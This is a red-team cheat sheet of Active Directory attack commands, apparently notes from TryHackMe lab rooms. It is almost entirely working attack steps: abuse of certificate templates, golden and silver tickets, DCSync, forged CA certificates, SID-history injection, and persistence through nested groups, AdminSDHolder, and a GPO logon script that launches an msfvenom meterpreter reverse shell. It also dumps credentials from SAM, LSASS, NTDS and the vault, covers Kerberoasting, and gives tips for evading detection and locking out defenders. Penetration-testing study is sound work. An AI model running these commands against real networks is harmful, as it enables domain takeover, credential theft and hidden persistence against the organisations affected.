https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/tools/bloodhound
https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
https://github.com/ZephrFish/Bloodhound-CustomQueries
https://github.com/hausec/Bloodhound-Custom-Queries


## Finding Vulnerable Certificate Templates

`certutil -Template -v > templates.txt`*This will provide output on all configured templates.*
https://github.com/GhostPack/Certify
https://github.com/GhostPack/ForgeCert
(https://github.com/GhostPack/PSPKIAudit)

# In our case, we are looking for a template with the following poisonous parameter combination:

    Client Authentication - The certificate can be used for Client Authentication.
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - The certificate template allows us to specify the Subject Alternative Name (SAN).
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - The certificate will be exportable with the private key.
    Certificate Permissions - We have the required permissions to use the certificate template.

# Type mmc and hit enter
`C:\>mmc`
    Click File->Add/Remove Snap-in..
    Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts.
    Click OK

You should now see the Certificate snap-in:

We will request a personal certificate:

    Right Click on Personal and select All Tasks->Request New Certificate...
    Click Next twice to select the AD enrollment policy.
    You will see that we have one template that we can request, but first, we need to provide additional information.
    Click on the More Information warning.
    Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add.
    Change the Alternative name Type option to User principal name.
    Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add.

Once you are happy with it, click Apply and OK. Then, select the certificate and click Enroll. You should be able to see your certificate:

The last step is to export our certificate with the private key:

    Right-click on the certificate and select All Tasks->Export...
    Click Next, select Yes, export the private key, and click Next.
    Click Next, then set a password for the certificate since the private key cannot be exported without a password.
    Click Next and select a location to store the certificate.
    Click Next and finally click Finish.

# User Impersonation through a Certificate
`\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101`*Ask ticket granting ticket*

# Use the ticket for access 
`mimikatz # privilege::debug`
`mimikatz # kerberos::ptt administrator.kirbi`
`mimikatz # exit`
`dir \\THMDC.za.tryhackme.loc\c$\`

# Golden ticket mimikatz
The ingredetients we need:
    The FQDN of the domain
    The Security Identifier (SID) of the domain
    The username of the account we want to impersonate
    The KRBTGT password hash

`mimikatz # privilege::debug`
`mimikatz # lsadump::dcsync /user:za\krbtgt`

# Cross forest trust golden ticket(AD-RSAT Powershell cmdlets)
`Get-ADComputer -Identity "THMDC"`*recover the SID of the child domain controller*
`Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc`*recover the SID of the parent domain controller*

`mimikatz # privilege::debug`

`mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt`

`mimikatz # exit`

`dir \\thmdc.za.tryhackme.loc\c$`
`dir \\thmrootdc.tryhackme.loc\c$\` *So works for both domains*

## Persistence in AD
# DC SYNC all 
`mimikatz # log syncemup_dcdump.txt `
`mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all`*Get all username, hashes and etc*
# DC SYNC Alrternative of mimi(remote ofc)
`python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP`
0x36c8d26ec0df8b23ce63bcefa6e2d821

# Forge tickets
` Get-ADDomain` *Get the domain SID*
*All the other information can be found on a dc sync*

**Golden ticket**
`mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt`

**Silver ticket**
`         
mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt`

# Generating our own Certificates become CA and make them cry
`mimikatz # crypto::certificates /systemstore:local_machine`
`mimikatz # privilege::debug`
`mimikatz # crypto::capi`
`mimikatz # crypto::cng`
`mimikatz # crypto::certificates /systemstore:local_machine /export`*The exported certificates will be stored in both PFX and DER format to disk, The za-THMDC-CA.pfx certificate is the one we are particularly interested in. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.*

`C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 `

    CaCertPath - The path to our exported CA certificate.
    CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
    Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
    SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
    NewCertPath - The path to where ForgeCert will store the generated certificate.
    NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

`C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101`*Get the TGT*

    /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
    /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
    /certificate - Path to the certificate we have generated
    /password - The password for our certificate file
    /outfile - The file where our TGT will be output to
    /domain - The FQDN of the domain we are currently attacking
    /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

`mimikatz # kerberos::ptt administrator.kirbi`
`mimikatz # exit`

# SID Persistence(Domain adm privs)

Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied.

`Get-ADUser <your ad username> -properties sidhistory,memberof`*Check the SID history of the account we want*
`Get-ADGroup "Domain Admins"` *get the SID of the Domain Admins group*

`Import-Module DSInternals`
`Stop-Service ntds -Force`
`Add-ADDBSidHistory -SamAccountName 'donald.ross' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath 'C:\Windows\NTDS\ntds.dit'`
`Start-Service ntds`

# Nested group persistence
**For instance, we have an alert that fires off when a new member is added to the Domain Admins group. That is a good alert to have, but it won't fire off if a user is added to a subgroup within the Domain Admins group. We would make use of the existing groups to perform nesting instead of creating them as we will do below. However, this is something you would never do on a normal red team assessment !!**

`New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security` *creating a new base group that we will hide in the People->IT Organisational Unit (OU)*

`New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security`

`Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"`*Let's now create another group in the People->Sales OU and add our previous group as a member:*

`Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup2"` *add that group to the Domain Admins group:*

`Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"`*add our low-privileged AD user to the first group we created*

# Persisting through AD Group Templates
Inject into the templates that generate the default groups. By injecting into these templates, even if they remove our membership, we just need to wait until the template refreshes, and we will once again be granted membership.

To avoid kicking users out of their RDP sessions, it will be best to RDP into THMWRK1 using your low privileged credentials, use the runas command to inject the Administrator credentials, and then execute MMC from this new terminal:

`runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe`

*Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:*

*Navigate to the Security of the group (Right-click->Properties->Security):*
*Let's add our low-privileged user and grant Full Control:
    Click Add.
    Search for your low-privileged username and click Check Names.
    Click OK.
    Click Allow on Full Control.
    Click Apply.
    Click OK.*

# GPO almost impossible to kick me out
*Create a GPO that is linked to the Admins OU, which will allow us to get a shell on a host every time one of them authenticates to a host.*

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe`

*Create the following script .bat*
`copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe`


`scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/`
`scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/` *SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:*

`msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"`*listener*

**You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.**

GPO Creation

The first step uses our Domain Admin account to open the Group Policy Management snap-in:

    In your runas-spawned terminal, type MMC and press enter.
    Click on File->Add/Remove Snap-in...
    Select the Group Policy Management snap-in and click Add
    Click OK

We will write a GPO that will be applied to all Admins, so right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as username - persisting GPO:

Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can right-click on your policy and select edit:

Let's get back to our Group Policy Management Editor:

    Under User Configuration, expand Policies->Windows Settings.
    Select Scripts (Logon/Logoff).
    Right-click on Logon->Properties
    Select the Scripts tab.
    Click Add->Browse.

Let's navigate to where we stored our Batch and binary files, Select your Batch file as the script and click Open and OK. Click Apply and OK.

Go back to your MMC windows, click on your policy and then click on Delegation:

By default, all administrators have the ability to edit GPOs. Let's remove these permissions:

    Right-Click on ENTERPRISE DOMAIN CONTROLLERS and select Edit settings, delete, modify security.
    Click on all other groups (except Authenticated Users) and click Remove.

Click on Advanced and remove the Created Owner from the permissions:

We could replace Authenticated Users with Domain Computers to ensure that computers can still read and apply the policy, but prevent any user from reading the policy.

    Click Add.
    Type Domain Computers, click Check Names and then OK.
    Select Read permissions and click OK.
    Click on Authenticated Users and click Remove.

Right after you perform these steps, you will get an error that you can no longer read your own policy:

# Credential harvesting

# Dump local hashes
## One way 
*cmd.exe prompt with administrator privileges*
`wmic shadowcopy call create Volume='C:\'`*wmic command to create a copy shadow of C: drive*
`vssadmin list shadows`*Listing the Available Shadow Volumes*
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam`
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system` *Copying the SAM and SYSTEM file from the Shadow Volume*
`python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL`*Check the hashes* 

## The other way
`reg save HKLM\sam C:\users\Administrator\Desktop\sam`
`reg save HKLM\system C:\users\Administrator\Desktop\system`*Registry dump those*
`python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL`

# Protected LSASS dump
`mimikatz # privilege::debug`
`mimikatz # !+`*Loading the mimidrv Driver into Memory*
`!processprotect /process:lsass.exe /remove`*Removing the LSA Protection*
`mimikatz # sekurlsa::logonpasswords`*Dump*

# Dumping credentials manager
`mimikatz # privilege::debug`
`mimikatz # sekurlsa::credman`
`mimikatz # vault::cred /patch`

# Dump Credential Manager
## Web cred dump
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1#
`C:\Users\Administrator>vaultcmd /list`
`C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"`
`powershell -ex bypass`
`Import-Module C:\Tools\Get-WebCredentials.ps1`
`Get-WebCredentials`

## Windows cred dump
`C:\Users\thm>cmdkey /list`*Enumerating for Stored Windows Credentials*
`runas /savecred /user:THM.red\thm-local cmd.exe`*Run CMD.exe As a User with the /savecred argument*
THM{Runa5S4veCr3ds}

# NTDS dump from the domain controller(local adm rights)
`powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`*Dumping the content of the NTDS file*
*And then take them from the c:\temp and transfer them to your machine*
`python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local`


# checking LAPS( local account cred)
`dir "C:\Program Files\LAPS\CSE"`
`Find-AdmPwdExtendedRights -Identity *`*Finding Users with AdmPwdExtendedRights Attribute*
`net groups "THMGroupReader"`*Finding Users belong to THMGroupReader Group, find a way to compromise him/her*
`Get-AdmPwdPassword -ComputerName creds-harvestin` *Getting LAPS Password with the Right User*

# Kerberoasting
`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation`*Enumerating for SPN Accounts*
`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-user `*Requesting a TGS Ticket as SPN Account*


# AS-REP Roasting
`python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt`*Performing an AS-REP Roasting Attack against Users List*
